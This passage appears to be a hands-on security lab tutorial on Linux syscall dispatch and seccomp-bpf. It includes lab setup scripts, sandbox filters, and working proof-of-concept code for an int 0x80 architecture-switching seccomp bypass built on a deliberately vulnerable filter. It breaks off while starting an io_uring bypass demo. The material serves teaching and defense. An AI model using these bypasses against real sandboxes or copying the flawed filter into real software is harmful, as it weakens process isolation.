# Tutorial: System Call Dispatch, Seccomp & Process Interaction Primitives — Hands-On Lab

> **Source document:** `domain2_chapter2B_syscall_seccomp_ptrace.md`
> **Scope:** Syscall dispatch internals, seccomp-bpf filter construction and bypass, io_uring attack surface, userfaultfd TOCTOU exploitation, ptrace injection and detection, cross-process memory access, syscall-level detection engineering and forensics.
> **Prerequisites:** Completion of Tutorial 2A (process memory lab). Familiarity with x86_64 assembly, C programming, Linux kernel concepts.

---

## Lab Environment Setup

### VM Requirements

| VM | Role | Specs | OS |
|----|------|-------|----|
| **VM-ATTACK** | Offensive exercises, exploit development | 4 vCPU, 8 GB RAM, 40 GB disk | Ubuntu 22.04 LTS (kernel 5.15 or 6.1) |
| **VM-FORENSICS** | Defensive monitoring, detection engineering | 4 vCPU, 8 GB RAM, 40 GB disk | Ubuntu 22.04 LTS or Debian 12 |

Both VMs should be on an isolated virtual network segment. **Never run offensive exercises on production systems.**

### Network Topology

```
┌─────────────────────┐     isolated vnet     ┌─────────────────────┐
│     VM-ATTACK        │◄───────────────────►│    VM-FORENSICS       │
│  192.168.56.10       │    192.168.56.0/24   │  192.168.56.20       │
│                      │                      │                      │
│ • seccomp dev        │                      │ • auditd + rules     │
│ • io_uring PoCs      │                      │ • bpftrace probes    │
│ • ptrace injection   │                      │ • Falco/Tetragon     │
│ • userfaultfd        │                      │ • seccomp-tools      │
│ • syscall analysis   │                      │ • Volatility3        │
└─────────────────────┘                      └─────────────────────┘
```

### Tool Installation — VM-ATTACK

```bash
#!/bin/bash
# install_attack_tools.sh — Run as root on VM-ATTACK

set -euo pipefail

apt-get update && apt-get install -y \
    build-essential gcc g++ make cmake \
    linux-headers-$(uname -r) \
    libseccomp-dev libseccomp2 seccomp \
    liburing-dev \
    nasm \
    strace ltrace \
    gdb gdb-multiarch \
    python3 python3-pip python3-venv \
    bpftrace bpfcc-tools libbpf-dev \
    git curl jq xxd \
    auditd audispd-plugins \
    binutils-dev \
    pkg-config

# pwntools for exploit development
python3 -m pip install --break-system-packages pwntools

# seccomp-tools (Ruby gem for BPF filter analysis)
apt-get install -y ruby ruby-dev
gem install seccomp-tools

# liburing from source (latest)
cd /opt
git clone https://github.com/axboe/liburing.git
cd liburing && ./configure && make -j$(nproc) && make install
ldconfig

echo "[+] VM-ATTACK tools installed"
```

### Tool Installation — VM-FORENSICS

```bash
#!/bin/bash
# install_forensics_tools.sh — Run as root on VM-FORENSICS

set -euo pipefail

apt-get update && apt-get install -y \
    build-essential gcc g++ make cmake \
    linux-headers-$(uname -r) \
    auditd audispd-plugins auditd-plugins \
    bpftrace bpfcc-tools libbpf-dev \
    python3 python3-pip python3-venv \
    golang-go \
    git curl jq \
    libseccomp-dev seccomp \
    ruby ruby-dev \
    sysstat

# seccomp-tools
gem install seccomp-tools

# Falco
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
    gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
    https://download.falco.org/packages/deb stable main" \
    > /etc/apt/sources.list.d/falcosecurity.list
apt-get update && apt-get install -y falco || echo "Falco install optional — continue"

# Tetragon (Cilium)
curl -fsSL https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz \
    | tar xz -C /usr/local/bin/ || echo "Tetragon install optional — continue"

# Volatility3
python3 -m pip install --break-system-packages volatility3

# Tracee (Aqua Security)
# Optional: docker pull aquasec/tracee:latest

echo "[+] VM-FORENSICS tools installed"
```

### Kernel Configuration Verification

```bash
#!/bin/bash
# verify_kernel_config.sh — Check required kernel features

echo "=== Kernel Feature Verification ==="
KCONFIG="/boot/config-$(uname -r)"

check_config() {
    local key="$1"
    local desc="$2"
    if grep -q "^${key}=y" "$KCONFIG" 2>/dev/null || \
       grep -q "^${key}=m" "$KCONFIG" 2>/dev/null; then
        echo "[OK]  $key — $desc"
    else
        echo "[MISS] $key — $desc"
    fi
}

check_config CONFIG_SECCOMP "Seccomp support"
check_config CONFIG_SECCOMP_FILTER "Seccomp BPF filter"
check_config CONFIG_IO_URING "io_uring subsystem"
check_config CONFIG_USERFAULTFD "userfaultfd support"
check_config CONFIG_SECURITY_YAMA "Yama LSM"
check_config CONFIG_HAVE_ARCH_TRACEHOOK "ptrace tracehook"
check_config CONFIG_BPF_SYSCALL "eBPF syscall"
check_config CONFIG_AUDIT "Audit framework"
check_config CONFIG_AUDITSYSCALL "Syscall auditing"

echo ""
echo "=== Runtime Settings ==="
echo "Yama ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 'N/A')"
echo "unprivileged_userfaultfd: $(cat /proc/sys/vm/unprivileged_userfaultfd 2>/dev/null || echo 'N/A')"
echo "io_uring_disabled: $(cat /proc/sys/io_uring_disabled 2>/dev/null || echo 'N/A (pre-6.0)')"
echo "unprivileged_bpf_disabled: $(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo 'N/A')"
echo "kptr_restrict: $(cat /proc/sys/kernel/kptr_restrict)"
echo "dmesg_restrict: $(cat /proc/sys/kernel/dmesg_restrict)"
```

### Lab Working Directory

```bash
mkdir -p ~/syscall_lab/{offensive,defensive,framework,logs}
cd ~/syscall_lab
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Syscall Dispatch Internals Explorer

**Objective:** Understand x86_64 syscall entry mechanics, `pt_regs` layout, `sys_call_table` lookup, and the difference between `syscall` instruction and `int 0x80` compat path.

#### Step 1.1: Syscall Entry Point Inspector

Write a program that makes system calls through both the native `syscall` instruction and the legacy `int 0x80` path, observing the differences.

```c
/* offensive/syscall_entry_explorer.c
 * Demonstrates x86_64 syscall dispatch via both native and compat paths.
 * Build: gcc -o syscall_entry_explorer syscall_entry_explorer.c -no-pie
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>

static long native_syscall_write(int fd, const char *buf, size_t len)
{
    long ret;
    __asm__ volatile (
        "mov %1, %%rax\n"   /* syscall number: write = 1 on x86_64 */
        "mov %2, %%rdi\n"   /* arg1: fd */
        "mov %3, %%rsi\n"   /* arg2: buf */
        "mov %4, %%rdx\n"   /* arg3: len */
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r" (ret)
        : "i" ((long)SYS_write),
          "r" ((long)fd),
          "r" ((long)buf),
          "r" ((long)len)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
    );
    return ret;
}

static long compat_int80_write(int fd, const char *buf, size_t len)
{
    long ret;
    /* int 0x80 uses 32-bit syscall numbers:
     * write = 4 on i386 (NOT 1 like x86_64)
     * args in ebx, ecx, edx (NOT rdi, rsi, rdx) */
    __asm__ volatile (
        "mov $4, %%eax\n"    /* 32-bit write syscall number */
        "mov %1, %%ebx\n"    /* arg1: fd */
        "mov %2, %%ecx\n"    /* arg2: buf (must be in low 4GB) */
        "mov %3, %%edx\n"    /* arg3: len */
        "int $0x80\n"
        "movslq %%eax, %0\n" /* sign-extend 32-bit result */
        : "=r" (ret)
        : "r" ((int)fd),
          "r" ((int)(uintptr_t)buf),
          "r" ((int)len)
        : "eax", "ebx", "ecx", "edx", "memory"
    );
    return ret;
}

static void dump_registers_at_syscall(void)
{
    uint64_t rcx_after, r11_after;

    /* After 'syscall', RCX = saved RIP, R11 = saved RFLAGS */
    __asm__ volatile (
        "mov $39, %%rax\n"   /* getpid — harmless syscall */
        "syscall\n"
        "mov %%rcx, %0\n"
        "mov %%r11, %1\n"
        : "=r" (rcx_after), "=r" (r11_after)
        :
        : "rax", "rcx", "r11", "rdi", "rsi", "rdx", "r10", "r8", "r9"
    );

    printf("[*] After syscall instruction:\n");
    printf("    RCX (saved RIP): 0x%016lx\n", rcx_after);
    printf("    R11 (saved RFLAGS): 0x%016lx\n", r11_after);
    printf("    R11 decoded: IF=%lu DF=%lu SF=%lu ZF=%lu\n",
           (r11_after >> 9) & 1, (r11_after >> 10) & 1,
           (r11_after >> 7) & 1, (r11_after >> 6) & 1);
}

int main(void)
{
    printf("=== Syscall Entry Point Explorer ===\n\n");

    /* 1. Native syscall instruction */
    const char msg1[] = "[native] Hello via syscall instruction\n";
    long ret1 = native_syscall_write(STDOUT_FILENO, msg1, sizeof(msg1) - 1);
    printf("    Return value: %ld\n\n", ret1);

    /* 2. Legacy int 0x80 compat path */
    /* Note: buffer must be in low 4GB for 32-bit addressing */
    static char msg2[] = "[compat] Hello via int 0x80\n";
    long ret2 = compat_int80_write(STDOUT_FILENO, msg2, sizeof(msg2) - 1);
    printf("    Return value: %ld\n\n", ret2);

    /* 3. Register state after syscall instruction */
    dump_registers_at_syscall();

    /* 4. Syscall number comparison */
    printf("\n[*] Syscall number mapping comparison:\n");
    printf("    %-12s  %-10s  %-10s\n", "Syscall", "x86_64", "i386");
    printf("    %-12s  %-10d  %-10d\n", "read", 0, 3);
    printf("    %-12s  %-10d  %-10d\n", "write", 1, 4);
    printf("    %-12s  %-10d  %-10d\n", "open", 2, 5);
    printf("    %-12s  %-10d  %-10d\n", "close", 3, 6);
    printf("    %-12s  %-10d  %-10d\n", "execve", 59, 11);
    printf("    %-12s  %-10d  %-10d\n", "mmap", 9, 90);
    printf("\n[!] SECURITY: int 0x80 from 64-bit process uses DIFFERENT\n");
    printf("    syscall table (ia32_sys_call_table). Seccomp filters that\n");
    printf("    check only 'nr' without validating 'arch' are bypassable.\n");

    return 0;
}
```

**Build and run:**

```bash
cd ~/syscall_lab/offensive
gcc -o syscall_entry_explorer syscall_entry_explorer.c -no-pie
./syscall_entry_explorer
```

**Expected output:** Both paths produce output. The native `syscall` path returns the correct byte count. The `int 0x80` path uses different argument registers and syscall numbers. Register dump shows RCX = return address and R11 = saved RFLAGS after `syscall` instruction.

#### Step 1.2: Syscall Table Offset Calculator

```c
/* offensive/syscall_table_offset.c
 * Calculates sys_call_table offsets for key security-relevant syscalls.
 * Build: gcc -o syscall_table_offset syscall_table_offset.c
 */
#include <stdio.h>
#include <sys/syscall.h>

struct syscall_info {
    const char *name;
    long nr;
    const char *risk;
};

int main(void)
{
    struct syscall_info table[] = {
        {"execve",             __NR_execve,             "Process execution"},
        {"execveat",           __NR_execveat,           "Process execution (at)"},
        {"clone",              __NR_clone,              "Process/thread creation"},
        {"clone3",             __NR_clone3,             "Process creation (modern)"},
        {"fork",               __NR_fork,               "Process creation (legacy)"},
        {"ptrace",             __NR_ptrace,             "Process tracing/injection"},
        {"process_vm_readv",   __NR_process_vm_readv,   "Cross-process memory read"},
        {"process_vm_writev",  __NR_process_vm_writev,  "Cross-process memory write"},
#ifdef __NR_io_uring_setup
        {"io_uring_setup",     __NR_io_uring_setup,     "io_uring ring creation"},
        {"io_uring_enter",     __NR_io_uring_enter,     "io_uring submission"},
        {"io_uring_register",  __NR_io_uring_register,  "io_uring resource registration"},
#endif
#ifdef __NR_userfaultfd
        {"userfaultfd",        __NR_userfaultfd,        "TOCTOU exploitation primitive"},
#endif
        {"mount",              __NR_mount,              "Filesystem mount"},
        {"umount2",            __NR_umount2,            "Filesystem unmount"},
        {"pivot_root",         __NR_pivot_root,         "Root filesystem change"},
        {"unshare",            __NR_unshare,            "Namespace creation"},
        {"setns",              __NR_setns,              "Namespace entry"},
        {"init_module",        __NR_init_module,        "Kernel module load"},
        {"finit_module",       __NR_finit_module,       "Kernel module load (fd)"},
        {"delete_module",      __NR_delete_module,      "Kernel module unload"},
        {"mmap",               __NR_mmap,               "Memory mapping"},
        {"mprotect",           __NR_mprotect,           "Memory protection change"},
        {"seccomp",            __NR_seccomp,            "Seccomp filter install"},
        {"bpf",                __NR_bpf,                "eBPF operations"},
        {"perf_event_open",    __NR_perf_event_open,    "Performance monitoring"},
        {"kexec_load",         __NR_kexec_load,         "Kernel replacement"},
    };

    int count = sizeof(table) / sizeof(table[0]);

    printf("=== Security-Critical Syscall Numbers (x86_64) ===\n\n");
    printf("%-22s  %-6s  %-10s  %s\n", "Syscall", "NR", "Table Offset", "Risk Category");
    printf("%-22s  %-6s  %-10s  %s\n", "------", "--", "----------", "-------------");

    for (int i = 0; i < count; i++) {
        printf("%-22s  %-6ld  0x%-8lx  %s\n",
               table[i].name, table[i].nr,
               table[i].nr * 8,  /* 8 bytes per pointer on x86_64 */
               table[i].risk);
    }

    printf("\n[*] sys_call_table is an array of %ld-byte function pointers\n",
           (long)sizeof(void *));
    printf("[*] Table offset = NR * %ld\n", (long)sizeof(void *));
    printf("[*] Highest NR shown: ~%d — total table size: ~%ld bytes\n",
           450, 450 * (long)sizeof(void *));

    return 0;
}
```

**Build and run:**

```bash
gcc -o syscall_table_offset syscall_table_offset.c
./syscall_table_offset
```

**Verification:** Cross-reference the output NR values against `/usr/include/asm/unistd_64.h` on your system.

---

### Exercise 2: Seccomp-BPF Filter Construction and Bypass

**Objective:** Build seccomp filters using both raw BPF bytecode and libseccomp, then demonstrate the architecture-switching bypass and understand filter chaining.

#### Step 2.1: Raw BPF Seccomp Filter — Default-Deny Sandbox

```c
/* offensive/raw_seccomp_sandbox.c
 * Constructs a seccomp filter from raw BPF bytecode.
 * Demonstrates architecture validation, default-deny, and filter structure.
 * Build: gcc -o raw_seccomp_sandbox raw_seccomp_sandbox.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>
#include <signal.h>

static void sigsys_handler(int sig, siginfo_t *info, void *ucontext)
{
    const char msg[] = "[TRAP] SIGSYS received — seccomp blocked a syscall\n";
    write(STDERR_FILENO, msg, sizeof(msg) - 1);

    char buf[128];
    int len = snprintf(buf, sizeof(buf),
        "  syscall NR: %d, arch: 0x%x, IP: %p\n",
        info->si_syscall, info->si_arch, info->si_call_addr);
    write(STDERR_FILENO, buf, len);
}

int main(int argc, char *argv[])
{
    int mode = 0;   /* 0 = KILL, 1 = ERRNO, 2 = TRAP */

    if (argc > 1) {
        if (strcmp(argv[1], "errno") == 0) mode = 1;
        else if (strcmp(argv[1], "trap") == 0) mode = 2;
    }

    printf("[*] Installing raw BPF seccomp filter (mode=%s)\n",
           mode == 0 ? "KILL" : mode == 1 ? "ERRNO" : "TRAP");

    /* Install SIGSYS handler for TRAP mode */
    if (mode == 2) {
        struct sigaction sa = {
            .sa_sigaction = sigsys_handler,
            .sa_flags = SA_SIGINFO,
        };
        sigemptyset(&sa.sa_mask);
        sigaction(SIGSYS, &sa, NULL);
    }

    /*
     * BPF filter program:
     * 1. Check arch == AUDIT_ARCH_X86_64 (reject compat calls)
     * 2. Load syscall number
     * 3. Allow: read, write, close, fstat, exit_group, rt_sigreturn,
     *          brk, mmap, munmap, mprotect, sigaction, sigprocmask
     * 4. Default action on anything else
     */
    uint32_t default_action;
    switch (mode) {
    case 0: default_action = SECCOMP_RET_KILL_PROCESS; break;
    case 1: default_action = SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA); break;
    case 2: default_action = SECCOMP_RET_TRAP; break;
    default: default_action = SECCOMP_RET_KILL_PROCESS;
    }

    struct sock_filter filter[] = {
        /* [0] Load architecture */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, arch)),
        /* [1] Check arch == x86_64 */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        /* [2] Wrong arch — kill unconditionally */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

        /* [3] Load syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),

        /* [4] Allow list — jump to ALLOW instruction if matched */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read,          11, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write,         10, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_close,          9, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fstat,          8, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit_group,     7, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_rt_sigreturn,   6, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_brk,            5, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_mmap,           4, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_munmap,         3, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_mprotect,       2, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_rt_sigaction,   1, 0),

        /* [15] Default: deny */
        BPF_STMT(BPF_RET | BPF_K, default_action),
        /* [16] Allow */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    /* PR_SET_NO_NEW_PRIVS required for non-root seccomp */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    /* Install filter via seccomp() syscall */
    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp(SET_MODE_FILTER)");
        return 1;
    }

    printf("[+] Seccomp filter active. Allowed: read,write,close,fstat,exit_group,\n");
    printf("    rt_sigreturn,brk,mmap,munmap,mprotect,rt_sigaction\n");
    printf("[*] PID: %d\n\n", getpid());

    /* Test: this write() should work */
    const char ok[] = "[OK] write() to stdout succeeded\n";
    write(STDOUT_FILENO, ok, sizeof(ok) - 1);

    /* Test: getpid() should be blocked */
    printf("[*] Attempting getpid() — should be blocked...\n");
    long ret = syscall(__NR_getpid);
    if (ret < 0) {
        printf("[BLOCKED] getpid() returned %ld, errno=%d (%s)\n",
               ret, errno, strerror(errno));
    } else {
        printf("[UNEXPECTED] getpid() returned %ld (filter not working!)\n", ret);
    }

    /* Test: execve should be blocked */
    printf("[*] Attempting execve(\"/bin/ls\") — should be blocked...\n");
    char *const args[] = {"/bin/ls", NULL};
    ret = syscall(__NR_execve, "/bin/ls", args, NULL);
    printf("[BLOCKED] execve returned %ld, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    return 0;
}
```

**Build and test:**

```bash
gcc -o raw_seccomp_sandbox raw_seccomp_sandbox.c

# Mode 1: KILL (process dies on blocked syscall)
./raw_seccomp_sandbox
# Expected: "Bad system call" after getpid() attempt

# Mode 2: ERRNO (blocked syscall returns EPERM)
./raw_seccomp_sandbox errno
# Expected: getpid() returns -1 with EPERM

# Mode 3: TRAP (SIGSYS handler fires)
./raw_seccomp_sandbox trap
# Expected: SIGSYS handler prints syscall info
```

#### Step 2.2: Architecture-Switching Seccomp Bypass

This exercise demonstrates the critical vulnerability in seccomp filters that fail to validate the `arch` field.

```c
/* offensive/seccomp_arch_bypass.c
 * Demonstrates the int 0x80 architecture-switching bypass.
 * Installs a VULNERABLE filter (no arch check), then bypasses it via compat path.
 * Build: gcc -o seccomp_arch_bypass seccomp_arch_bypass.c -no-pie -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>
#include <string.h>
#include <errno.h>

static long int80_write(int fd, const char *buf, size_t len)
{
    long ret;
    /* i386 write = NR 4, args in ebx/ecx/edx */
    __asm__ volatile (
        "mov $4, %%eax\n"
        "mov %1, %%ebx\n"
        "mov %2, %%ecx\n"
        "mov %3, %%edx\n"
        "int $0x80\n"
        "movslq %%eax, %0\n"
        : "=r" (ret)
        : "r" ((int)fd),
          "r" ((int)(uintptr_t)buf),
          "r" ((int)len)
        : "eax", "ebx", "ecx", "edx", "memory"
    );
    return ret;
}

int main(void)
{
    printf("=== Seccomp Architecture-Switching Bypass Demo ===\n\n");

    /* VULNERABLE filter: blocks write (NR 1) but does NOT check arch */
    struct sock_filter vuln_filter[] = {
        /* Load syscall number — NO arch check! */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        /* Block write (NR 1 on x86_64) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 1, 0, 1),  /* write = NR 1 */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
        /* Allow everything else */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(vuln_filter) / sizeof(vuln_filter[0]),
        .filter = vuln_filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp");
        return 1;
    }
    printf("[+] Vulnerable seccomp filter installed (blocks NR 1, no arch check)\n\n");

    /* Test 1: Native write (NR 1 on x86_64) — should be blocked */
    const char msg1[] = "[native] This should NOT appear (write blocked)\n";
    long ret = write(STDOUT_FILENO, msg1, sizeof(msg1) - 1);
    printf("[*] Native write() returned: %ld (errno=%d: %s)\n",
           ret, errno, strerror(errno));

    /* Test 2: Compat int 0x80 write (NR 4 on i386) — bypasses filter! */
    static char msg2[] = "[BYPASS] Write via int 0x80 succeeded!\n";
    ret = int80_write(STDOUT_FILENO, msg2, sizeof(msg2) - 1);

    /* Test 3: Show the issue */
    static char msg3[] = "[!] Filter checked NR=1 (x86_64 write) but int 0x80\n"
                         "    used NR=4 (i386 write) — different table, bypassed!\n";
    int80_write(STDOUT_FILENO, msg3, sizeof(msg3) - 1);

    return 0;
}
```

**Build and run:**

```bash
gcc -o seccomp_arch_bypass seccomp_arch_bypass.c -no-pie -static
./seccomp_arch_bypass
```

**Expected output:** The native `write()` call is blocked (returns -1, EPERM). The `int 0x80` call succeeds because the filter checks NR 1 but the compat path uses NR 4 for the same operation.

**Fix verification:** Modify the filter to add arch validation at the beginning (as shown in Exercise 2.1) and verify the bypass no longer works.

#### Step 2.3: libseccomp Advanced Sandbox

```c
/* offensive/libseccomp_sandbox.c
 * Full-featured seccomp sandbox using libseccomp with argument filtering.
 * Build: gcc -o libseccomp_sandbox libseccomp_sandbox.c -lseccomp
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

int main(void)
{
    scmp_filter_ctx ctx;
    int rc;

    printf("=== libseccomp Advanced Sandbox ===\n\n");

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

    /* Default: kill process on any non-allowed syscall */
    ctx = seccomp_init(SCMP_ACT_KILL_PROCESS);
    if (!ctx) { fprintf(stderr, "seccomp_init failed\n"); return 1; }

    /* Essential syscalls */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(newfstatat), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigaction), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigprocmask), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(futex), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getrandom), 0);

    /* write() only to stdout (fd=1) and stderr (fd=2) */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
                     SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
                     SCMP_A0(SCMP_CMP_EQ, STDERR_FILENO));

    /* mmap: allow but only without PROT_EXEC */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 1,
                     SCMP_A2(SCMP_CMP_MASKED_EQ, PROT_EXEC, 0));

    /* mprotect: allow but block adding PROT_EXEC */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 1,
                     SCMP_A2(SCMP_CMP_MASKED_EQ, PROT_EXEC, 0));

    /* Block execve/execveat with EPERM (graceful denial) */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(execve), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(execveat), 0);

    /* Block ptrace entirely */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(ptrace), 0);

    /* Block io_uring */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(io_uring_setup), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(io_uring_enter), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(io_uring_register), 0);

    /* openat: allow only O_RDONLY */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 1,
                     SCMP_A2(SCMP_CMP_MASKED_EQ, O_WRONLY | O_RDWR, 0));

    /* Load filter */
    rc = seccomp_load(ctx);
    if (rc < 0) {
        fprintf(stderr, "seccomp_load: %s\n", strerror(-rc));
        seccomp_release(ctx);
        return 1;
    }

    /* Export BPF bytecode for analysis */
    FILE *bpf_out = fopen("/tmp/sandbox_filter.bpf", "wb");
    if (bpf_out) {
        seccomp_export_bpf(ctx, fileno(bpf_out));
        fclose(bpf_out);
        printf("[+] BPF bytecode exported to /tmp/sandbox_filter.bpf\n");
    }

    seccomp_release(ctx);

    printf("[+] Sandbox active\n\n");

    /* Test suite */
    printf("[TEST 1] write(stdout): ");
    printf("OK\n");

    printf("[TEST 2] execve: ");
    rc = execl("/bin/ls", "ls", NULL);
    printf("blocked (errno=%d: %s)\n", errno, strerror(errno));

    printf("[TEST 3] openat(O_RDONLY): ");
    int fd = open("/etc/hostname", O_RDONLY);
    if (fd >= 0) {
        char buf[64] = {0};
        read(fd, buf, sizeof(buf) - 1);
        printf("OK — read: %s", buf);
        close(fd);
    } else {
        printf("blocked\n");
    }

    printf("[TEST 4] openat(O_WRONLY): ");
    fd = open("/tmp/test_seccomp", O_WRONLY | O_CREAT, 0644);
    if (fd >= 0) {
        printf("UNEXPECTED — should be blocked!\n");
        close(fd);
    } else {
        printf("blocked (errno=%d: %s)\n", errno, strerror(errno));
    }

    printf("[TEST 5] mmap(RWX): ");
    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        printf("blocked (no PROT_EXEC allowed)\n");
    } else {
        printf("UNEXPECTED — RWX mapping succeeded!\n");
        munmap(p, 4096);
    }

    printf("\n[*] All tests complete\n");
    return 0;
}
```

**Build and run:**

```bash
gcc -o libseccomp_sandbox libseccomp_sandbox.c -lseccomp
./libseccomp_sandbox
```

**Analyze the exported BPF bytecode:**

```bash
seccomp-tools disasm /tmp/sandbox_filter.bpf
```

---

### Exercise 3: io_uring Seccomp Bypass

**Objective:** Demonstrate that io_uring operations bypass seccomp filters that only block traditional syscalls, and understand the security implications for container environments.

#### Step 3.1: io_uring Bypass Proof-of-Concept

```c
/* offensive/iouring_seccomp_bypass.c
 * Demonstrates io_uring bypassing seccomp by performing file I/O
 * via the submission queue when the same operations are blocked
 * as direct syscalls.
 * Build: gcc -o iouring_seccomp_bypass iouring_seccomp_bypass.c -luring -lseccomp
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <liburing.h>

#define BUF_SIZE 256

int main(void)
{
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char buf[BUF_SIZE] = {0};
    int ret, fd;

    printf("=== io_uring Seccomp Bypass Demonstration ===\n\n");

    /* Step 1: Set up io_uring BEFORE installing seccomp filter */
    ret = io_uring_queue_init(16, &ring, 0);
    if (ret < 0) {
        fprintf(stderr, "io_uring_queue_init: %s\n", strerror(-ret));
        fprintf(stderr, "io_uring may be disabled (check io_uring_disabled sysctl)\n");
        return 1;
    }
    printf("[+] io_uring ring initialized (fd obtained before seccomp)\n");

    /* Step 2: Install seccomp filter that blocks openat and read */
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
    /* Block openat — this should prevent file access */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(openat), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(open), 0);
